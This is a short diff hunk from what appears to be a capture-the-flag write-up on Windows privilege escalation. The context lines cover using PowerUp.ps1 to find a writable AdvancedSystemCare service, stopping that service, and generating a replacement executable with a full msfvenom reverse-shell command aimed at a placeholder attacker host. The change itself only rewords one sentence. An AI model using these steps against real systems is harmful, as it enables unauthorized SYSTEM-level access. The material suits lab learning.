@@ -37,7 +37,7 @@ It's time to `load powershell` and open `powershell_shell` to fire up `PowerUp.p
 
 The first entry is what we need.
 An Advanced SystemCare9 service that we `CanRestart : True` with `AppendData` permissions, running as `LocalSystem` to escalate our privileges.
-`PowerUp.ps1` is flagging us an unquoted service path vulnerability as well, but now we will focus on the insecure service permissions one.
+`PowerUp.ps1` is flagging us an unquoted service path vulnerability as well, but we will focus on the insecure service permissions one.
 
 What we need now is to exit from the powershell instance `CTRL+C` and enter cmd `shell` to `sc stop AdvancedSystemCareService9` to upload the msfvenom shell we will create now in another terminal in our kali attacker, named as the executable `ASCService.exe`:
 `msfvenom -p windows/shell_reverse_tcp LHOST=xx.xx.xx.xx LPORT=4445 -e x86/shikata_ga_nai -f exe -o ASCService.exe`
